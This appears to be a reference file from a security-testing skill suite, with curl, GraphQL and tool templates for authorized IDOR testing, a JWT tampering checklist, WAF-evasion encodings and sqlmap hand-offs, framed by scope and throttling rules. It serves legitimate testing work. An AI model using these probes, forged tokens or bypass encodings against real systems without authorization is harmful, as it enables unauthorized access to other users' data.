# Payloads, request templates, and cross-cutting material

Everything here is shared infrastructure for variants V-01 … V-15: the two-account
procedure, curl replay templates with `<PLACEHOLDER>` slots, an ID-format catalog, the
JWT test checklist, GraphQL probe templates, enumeration throttle rules, encoding tricks,
tool invocations, and chain-it-with pointers. Templates never contain live targets —
fill every `<PLACEHOLDER>` from your own engagement notes.

## Table of contents

- [Two-account testing setup (the backbone)](#two-account-testing-setup-the-backbone)
- [Curl replay templates](#curl-replay-templates)
- [ID-format pattern catalog](#id-format-pattern-catalog)
- [JWT testing checklist (test steps, not exploit code)](#jwt-testing-checklist-test-steps-not-exploit-code)
- [GraphQL introspection & authorization probes](#graphql-introspection--authorization-probes)
- [Enumeration throttle: rate-limit politely, never hammer](#enumeration-throttle-rate-limit-politely-never-hammer)
- [Encoder / obfuscation tricks](#encoder--obfuscation-tricks)
- [Tool invocations (templates)](#tool-invocations-templates)
- [Chain it with](#chain-it-with)

---

## Two-account testing setup (the backbone)

Every proof in this skill is a *cross-principal* comparison. Do this setup before
touching any variant.

### Why one account proves nothing

Authorization is a relation between **who asks** and **what they ask for**. With a single
account, you only ever observe requests where asker and owner are the same principal —
and the server is *supposed* to return your own object. So every possible outcome is
consistent with a perfectly healthy system:

- `200 + your data` → could be "ownership check passed" (correct) or "no check at all" (broken).
- `403/404` → could be a real check, or just a wrong/guessed ID.

There is no discriminating signal. The moment **A requests B's object**, the outcomes
split: a correct system says `403/404`, a broken one says `200 + B's data`. That single
differential is the finding — and the reason one-account "IDOR reports" (usually a
soft-404 or dummy object) get triaged as invalid. Two accounts turn an opinion into
evidence, and the control request (same call as B, or with credentials stripped) gives
you the independent second signal the verification standard demands.

### Procedure

1. **Create both principals.** Account A (probe session) and Account B (target session)
   via the normal signup flow, two distinct emails, both inside program scope. Check the
   program's rules on multiple accounts first — most explicitly allow tester accounts;
   ask the program manager if unclear.
2. **Isolate the sessions.** Separate browser profiles (or containers) and separate curl
   cookie jars — never let one jar overwrite the other, and never replay a request with
   both cookies present. Cross-contaminated sessions are the #1 cause of bogus IDOR
   "confirmations".
   ```bash
   curl -sS -c jar_a.txt '<TARGET_URL>/login' -d 'user=<EMAIL_A>&pass=<PASS_A>' -X POST
   curl -sS -c jar_b.txt '<TARGET_URL>/login' -d 'user=<EMAIL_B>&pass=<PASS_B>' -X POST
   ```
3. **Seed identifiable objects.** Each account creates one object of every class you
   intend to test (note, document, order, file, key) with a unique marker string, e.g.
   B's note body = `B-MARKER-9271`, A's = `A-MARKER-4810`. Markers let you recognize
   whose data a response contains at a glance, even after redaction.
4. **Record the identifiers.** For each object note: `<OBJECT_ID_A>`, `<OBJECT_ID_B>`,
   `<USER_ID_A>`, `<USER_ID_B>`, plus tenant/role ids if the app has them. Classify the
   ID shape using the catalog below — it tells you whether enumeration is even feasible.
5. **Establish controls.** Three reference responses you will reuse in every proof:
   (a) A fetches A's object → expect `200`; (b) A fetches B's object → expect `403/404`;
   (c) no credentials at all → expect `401`. If (a) and (c) don't behave as expected,
   fix your setup before probing — a broken baseline invalidates everything after it.
6. **Prefer tester-owned data for writes.** Destructive probes (PUT/DELETE) run against
   B's *test* objects only — created in step 3 for this purpose. If a program restricts
   destructive testing, read-only proofs (V-01, V-02, V-12, V-15) still stand.
7. **Third-party objects: minimum touch.** Sometimes the only reachable objects belong
   to real users. Request *one* record, capture the minimum fields proving whose data it
   is (mask the rest), and stop. A redacted proof is enough for a report — never
   enumerate or exfiltrate a real user's data beyond that.

---

## Curl replay templates

Fill slots; keep jars separate; `-i` always on so you see status and headers.

```bash
# --- T1: own-object baseline (control A) ---------------------------------
curl -sS -i -b jar_a.txt '<TARGET_URL>/api/<RESOURCE>/<OBJECT_ID_A>'

# --- T2: cross-principal probe (the actual test) ------------------------
curl -sS -i -b jar_a.txt '<TARGET_URL>/api/<RESOURCE>/<OBJECT_ID_B>'

# --- T3: no-credentials control (V-02: missing auth vs missing check) ----
curl -sS -i -c /dev/null '<TARGET_URL>/api/<RESOURCE>/<OBJECT_ID_B>'

# --- T4: write probe — use only on B's tester-created object -------------
curl -sS -i -b jar_a.txt -X PUT '<TARGET_URL>/api/<RESOURCE>/<OBJECT_ID_B>' \
  -H 'Content-Type: application/json' -d '{"marker":"A-PROOF-1"}'
# then verify in B's session:  curl -sS -i -b jar_b.txt '<TARGET_URL>/api/<RESOURCE>/<OBJECT_ID_B>'

# --- T5: mass-assignment probe (V-04) ------------------------------------
curl -sS -i -b jar_a.txt -X POST '<TARGET_URL>/api/<RESOURCE>' \
  -H 'Content-Type: application/json' \
  -d '{"name":"probe","role":"admin","owner_id":"<USER_ID_A>"}'

# --- T6: HPP duplicate-parameter probe (V-07) ----------------------------
curl -sS -i -g -b jar_a.txt '<TARGET_URL>/api/<RESOURCE>?id=<OBJECT_ID_A>&id=<OBJECT_ID_B>'
curl -sS -i -b jar_a.txt '<TARGET_URL>/api/<RESOURCE>?id[]=<OBJECT_ID_A>&id[]=<OBJECT_ID_B>'

# --- T7: role/context header flip (V-11) ---------------------------------
curl -sS -i -b jar_a.txt -H 'X-Role: admin' '<TARGET_URL>/api/<ROLE_GATED_FUNCTION>'

# --- T8: version differential (V-10) -------------------------------------
curl -sS -i -b jar_a.txt '<TARGET_URL>/api/v2/<RESOURCE>/<OBJECT_ID_B>'   # expect 403
curl -sS -i -b jar_a.txt '<TARGET_URL>/api/v1/<RESOURCE>/<OBJECT_ID_B>'   # observe

# --- T9: nested-path segment matrix (V-13) -------------------------------
curl -sS -i --path-as-is -b jar_a.txt \
  '<TARGET_URL>/api/users/<USER_ID_A>/orders/<ORDER_ID_B>'
curl -sS -i --path-as-is -b jar_a.txt \
  '<TARGET_URL>/api/users/../users/<USER_ID_B>/orders/<ORDER_ID_B>'

# --- T10: tampered-token replay (V-14, token from the JWT checklist) ------
curl -sS -i -H 'Authorization: Bearer <TAMPERED_TEST_TOKEN>' \
  '<TARGET_URL>/api/<ROLE_GATED_FUNCTION>'
```

Always record **status + body + the matching control** together. A lone 200 is a lead,
not a finding.

---

## ID-format pattern catalog

Collect 3-5 legitimate IDs first (your own objects + any public listing), then classify:

| Shape | Example | Detection notes | Enumeration reality |
|---|---|---|---|
| **Sequential int** | `4819`, `4820`, `4821` | Exact `+1` (or small fixed) deltas; low cardinality; often visible in incrementing 404-vs-200 boundaries | Trivially enumerable — one probe per neighbor. Highest severity when unauthenticated. Sweep politely (see throttle note), stop at proof |
| **UUIDv1 (timestamp)** | `b438f2c0-58cc-**1**1e4-a1b2-0800200c9a66` | 3rd group starts with `1` → v1/v2. Decode time fields (60-bit timestamp, 100ns units since 1582-10-15): if it equals the object's known creation time, timestamp leaks are confirmed. Last 12 hex = node/MAC — constant node across IDs means fixed hardware/VM identity | Time-sorted and structurally guessable *around* an ID you own: neighbors exist at predictable timestamps. Test prediction against B's fresh object (V-08 step 5) |
| **UUIDv4 (random)** | `3f1c9a7e-8b2d-**4**e5a-**9**c3f-7a0d2e5b81c4` | 3rd group `4`; variant nibble `8|9|a|b`; no observable order or delta across samples | 122 bits — enumeration is infeasible; do NOT brute-force. Still an IDOR vector: any single leaked/guessed v4 (from logs, sourcemaps, referrers) is enough. IDs ≠ authorization |
| **Hashids / opaque slug** | `Xk3vP9aQ`, `aG9s_5Qw9L`, `invoice-n3x8p` | Mixed alphabet, fixed length, URL-safe chars; test *determinism*: same object id → same string across sessions/encodings indicates reversible encoding with a salt | Often crackable if salt is weak/short (known open-source decoders) — but authz must never rely on opacity. If decode works, you get an ID list for V-01 |
| **Snowflake (time-bucketed int)** | `1849273014589747200` (18-19 digits) | Time-ordered integers, monotonic even across accounts. Decode: `(id >> 22) + custom_epoch_ms` → creation ms; low bits = machine/sequence. Check whether observed creation times match the decoded epoch | Neighbors in time are neighbors in ID space → candidate generation is cheap. Confirm with one predicted ID owned by B |

**Workflow:** classify → pick the matching Detect steps in V-08 → if predictable,
combine with V-01/V-05 (predictability alone is not a vuln; missing authz makes it one).

---

## JWT testing checklist (test steps, not exploit code)

Work through in order; record the exact response for each step. Produce tampered
variants with a standard JWT testing tool (Burp **JWT Editor**, `jwt_tool`, or similar)
operating on **your own captured token** — this checklist deliberately contains no
forging code, only the test procedure and what each outcome means.

1. **Locate & decode.** Find the token (cookie / `Authorization: Bearer` / query). Decode
   header and payload (base64url — `jwt.io`, Burp Decoder, or your tool's inspector).
   Record: `alg`, `kid`, `jku`/`jwk`, `typ`; claims `sub`, `role`/`admin`/`scopes`,
   `tenant`/`org`, `exp`, `iat`, `nbf`. Note cookie flags (`HttpOnly`, `Secure`,
   `SameSite`) if it rides in a cookie.
2. **Baseline control.** Replay the *unmodified* token against a gated endpoint → expect
   `200`. This isolates "my token was already invalid" from later rejections.
3. **`alg:none` test.** Using the tool, produce a variant of your token with header
   `alg` set to `none` and no signature, and with a *modified claim* (flip `role` or
   `sub` to your other test account's value). Replay.
   - `401 invalid signature / malformed` → verification enforced (healthy, move on).
   - `200` **and** the claim change is honored on a gated resource → **V-14 confirmed**,
     critical. `200` but claim ignored → token-integrity issue, lower severity; note it.
4. **RS256→HS256 confusion test.** If step 1 showed an asymmetric alg (`RS256`/`ES256`),
   have the tool re-sign a modified token with the `HS256` algorithm using the server's
   public key material (from `/.well-known/jwks.json` or the app's JWT docs) as the HMAC
   key. Replay.
   - Accepted + claim honored → **V-14 confirmed**: server uses public key as shared
     secret. Rejected → healthy for this vector.
5. **`kid` / key-reference injection test.** If `kid`, `jku`, or `jwk` headers exist,
   change the value to something the server does not control: an unknown `kid` (error
   comparison), a `jku` pointing at a URL you observe being fetched (use your own
   request-bin in an authorized lab; watch for the fetch arriving), a path-looking `kid`
   (`../../...` style — note whether the error shifts to file/DB semantics). The *finding
   at this step* is an attacker-influenceable key-selection path: record which error
   classes differ. If lookup is a SQL/NoSQL query, hand deep payloads to
   `sqli-testing` rather than probing further here.
6. **`exp` / `iat` / `nbf` tampering.** With your tool: (a) push `exp` far into the
   future; (b) set `iat`/`nbf` into the future; (c) set `iat` far into the past; (d)
   shrink `exp` to the past. Replay each.
   - Consistent rejection with time-related errors → time claims enforced (record any
     leeway in seconds — large leeway is a hardening note).
   - Expired/forged-time token accepted → session-fixation/hardening finding; severity
     depends on whether logout/token revocation relies solely on `exp`.
7. **Claim tampering (effect test).** Take an accepted tampered token and hit a resource
   gated by the changed claim: role claim → admin function (V-06 endpoint); `sub` claim →
   the other test account's object (control: fetch that object as B to confirm ownership);
   `tenant`/`org` claim → cross-tenant surface (V-15). Accepted + honored = escalation
   finding; accepted + ignored = integrity finding with reduced severity.
8. **Wrap-up.** Redact all tokens in evidence (they are bearer credentials), and state
   in the report which verification step (3/4/6/7) failed — that maps directly to the
   remediation sentence in V-14.

---

## GraphQL introspection & authorization probes

Fill `<TARGET_URL>` (usually `/graphql`), keep `-b jar_a.txt` / `-b jar_b.txt` separate.

```bash
# --- G1: full introspection (schema inventory) ---------------------------
curl -sS -b jar_a.txt -X POST '<TARGET_URL>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name } } } }"}'

# --- G2: field/arg detail for one type (find $id: ID! entry points) ------
curl -sS -b jar_a.txt -X POST '<TARGET_URL>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ __type(name:\"<TYPE_NAME>\") { fields { name args { name type { name kind } } type { name kind } } } }"}'

# --- G3: partial introspection fallback (full introspection disabled) ----
curl -sS -b jar_a.txt -X POST '<TARGET_URL>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } } }"}'
# Also probe: { __type(name:\"Query\") { fields { name } } }  and error-based field suggestions.

# --- G4: own-node baseline ----------------------------------------------
curl -sS -b jar_a.txt -X POST '<TARGET_URL>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"query($id:ID!){ node(id:$id){ ... on <TYPE> { id <PRIVATE_FIELD> } } }","variables":{"id":"<OWN_BASE64_ID>"}}'

# --- G5: cross-principal probe (swap the decoded inner id) ---------------
# Global IDs are usually base64("<Type>:<id>") — encode locally:
#   printf '%s' '<TYPE>:<OTHER_USER_NUMERIC_ID>' | base64
curl -sS -b jar_a.txt -X POST '<TARGET_URL>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"query($id:ID!){ node(id:$id){ ... on <TYPE> { id <PRIVATE_FIELD> } } }","variables":{"id":"<BASE64_TYPE_B_ID>"}}'

# --- G6: no-token control ------------------------------------------------
curl -sS -c /dev/null -X POST '<TARGET_URL>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"query($id:ID!){ node(id:$id){ ... on <TYPE> { id <PRIVATE_FIELD> } } }","variables":{"id":"<BASE64_TYPE_B_ID>"}}'

# --- G7: field-level authz pass (sensitive fields on your OWN node) ------
curl -sS -b jar_a.txt -X POST '<TARGET_URL>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ me { id email phone internalNotes } }"}'

# --- G8: error-shaping oracle (does "not found" vs "not authorized" leak existence?)
curl -sS -b jar_a.txt -X POST '<TARGET_URL>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"query($id:ID!){ node(id:$id){ id } }","variables":{"id":"<BASE64_RANDOM_GUESS>"}}'
```

**Reading the results:** G5 returning B's private fields (matched against B's own G4
response) = **V-12**. G7 returning fields the UI never shows = BOPLA on top. G8's
differential is an enumeration oracle worth reporting alongside V-12 when IDs are
otherwise unpredictable. Aliases/batching (`{ a: user(id:1){...} b: user(id:2){...} }`)
are useful to compress probes — respect the throttle note below even over batching.

---

## Enumeration throttle: rate-limit politely, never hammer

Enumeration is where testers cause outages and get banned — and where scope violations
happen. Rules:

- **Stay far below the limit:** default ≤1 request/second for sweeps, `sleep 1` between
  attempts, and pause on any `429`, `Retry-After`, CAPTCHA, or WAF challenge. Honor
  `Retry-After` exactly; if repeated `5xx` appear, stop and reassess.
- **Small candidate sets:** you are demonstrating a flaw, not dumping a database. 10-50
  IDs (or fewer) is plenty for a statistical claim; **1-2 cross-principal hits are
  sufficient proof** — stop the sweep there.
- **Proof, not corpus:** never collect other users' records "while you're at it". Take
  the minimum redacted sample, then stop. Bulk harvesting turns a legitimate finding into
  your own incident.
- **Check program rules first:** many programs cap scanning rate, forbid DoS-adjacent
  behavior, or restrict testing windows. Those rules override any technique here.
- **Never** run unbounded loops (`while true`, full `1..2^31` integer sweeps, no-delay
  crawlers). Sequential-integer ID spaces make it *tempting*; the feasibility of a
  million requests is not a license to send them.
- Tool rate flags (templates below): ffuf `-rate 1`, sqlmap `--delay=1 --safe-thresh=5`,
  Burp Throttle/`Extensions → Network → rate limiting`. When in doubt, hand-test.

---

## Encoder / obfuscation tricks

Use these *after* a plain probe fails — to get past a WAF or an edge normalizer, not to
mask what you did. Report the working variant plainly.

| Trick | Example | When to use |
|---|---|---|
| URL-encode one char | `?id=-1`, `?id=48%20`, `%2d%31` | WAF pattern-matches the raw value |
| Double-encode | `%252f`, `%2527` | Edge decodes once, app decodes twice |
| Path case variation | `/API/Users/<id>` | Case-sensitive router vs. checker mismatch |
| Param name case | `?Id=`, `?ID=`, `?user_ID=` | Parser-level case folding differs across layers |
| Array / index syntax | `id[]=`, `id[0]=`, `id.`, `id_` | V-07 HPP and PHP/ASP/Node parser differences |
| Body format swap | JSON body ↔ form-encoded ↔ multipart | Check reads query, action reads body (or vice versa) |
| Param position swap | query ↔ body ↔ header (`X-Id`) | Layer-specific allow-lists |
| Method override | `X-HTTP-Method-Override: PUT`, `_method=DELETE` | Only one verb is guarded |
| Trailing slash / `;` / `//` | `/api/obj/<id>/`, `/api;/obj/<id>` | Router normalization vs. authz middleware |
| Raw path (`--path-as-is`) | `/api/users/../users/<id>/` | V-13 — curl normally "helpfully" normalizes |

---

## Tool invocations (templates)

```bash
# Polite sequential-ID sweep (single endpoint, tiny wordlist, 1 req/s)
seq <START_ID> <END_ID> | ffuf -u '<TARGET_URL>/api/<RESOURCE>/FUZZ' \
  -b 'session=<SESSION_A>' -w - -rate 1 -mc 200,403,404 -fs <SOFT404_LENGTH>

# Diff-aware probe: own vs foreign object side by side
diff <(curl -sS -b jar_a.txt "<TARGET_URL>/api/obj/<OBJECT_ID_A>") \
     <(curl -sS -b jar_a.txt "<TARGET_URL>/api/obj/<OBJECT_ID_B>")

# Header/context flip fuzzing (V-11) — small curated list, not a wordlist dump
for h in 'X-Role: admin' 'X-User-Type: staff' 'X-Tenant: <TENANT_ID_B>'; do
  curl -sS -o /dev/null -w "%{http_code} $h\n" -b jar_a.txt -H "$h" \
    '<TARGET_URL>/api/<FUNCTION>'; sleep 1
done

# JWT checklist driver (test-step execution, per section above)
jwt_tool <TOKEN> -T tamper     # inspect offered tamper modes; run steps 3,4,6,7
jwt_tool <TOKEN> -X kks        # key-confusion check when applicable (step 4)

# Mass-assignment field enumeration (V-04): small candidate list, one field at a time
ffuf -u '<TARGET_URL>/api/profile' -X PUT -b 'session=<SESSION_A>' \
  -H 'Content-Type: application/json' -d '{"FUZZ":1}' -w <ROLE_FIELD_LIST> -rate 1 -mc all

# SQLi hand-off when V-14 step 5 shows a query-shaped kid lookup:
sqlmap -u '<TARGET_URL>/api/lookup?kid=<VALUE>' --batch --delay=1 --safe-thresh=5
```

All invocations are templates: replace `<...>` slots, keep `-rate`/`--delay` at or below
1/s, and stop when proof is obtained.

---

## Chain it with

- **`csrf-testing`** — *state-changing endpoints.* A cross-principal write (V-01/V-05
  PUT/DELETE) with no CSRF token, lax `SameSite`, or a simple-JSON endpoint readable by
  `text/plain` POST becomes **one-click**: a victim's browser performs the write on
  another user's object. Test the state-changing IDOR with a CSRF lens — GET-based or
  token-less mutations escalate severity a full step. See `csrf-testing` for token
  extraction, tunnel, and CORS/CSWSH chains.
- **`business-logic-testing`** — *role assignment at registration.* If `role`,
  `tenant_id`, or `plan` can be injected during signup or a workflow step, you have V-04
  mass assignment feeding V-06 vertical escalation from minute one — the vertical bypass
  may be reachable without ever exploiting an authenticated endpoint. Also covers
  workflow/state-machine abuses (approval, OTP, payment steps) that pair with role flips.
  See `business-logic-testing` for registration, workflow, and race-condition chains.
- **`info-disclosure-testing`** — *leaked IDs in sourcemaps, logs, and bundles.* Most
  V-01/V-08 engagements start here: `.map` sourcemaps reveal admin routes and param
  names, `.git`/`.env` and stack traces leak object IDs and UUID examples, JS bundles
  expose GraphQL schemas and versioned paths (V-10/V-12), and open buckets/log files
  hand you the ID corpus that makes enumeration unnecessary. Run it first for recon, and
  cite any leaked ID as the starting point of your IDOR chain.

The rest of the suite: `xss-testing` (UI redress / self-XSS-assisted proofs),
`sqli-testing` (key-lookup injections found in the JWT checklist), `path-traversal-testing`
(V-13's `..` normalization reaching files), `ssrf-testing` (second-order sinks that
fetch attacker URLs, V-05), `sandbox-escape-testing` — cross-reference by directory name
when a finding's root cause belongs next door.
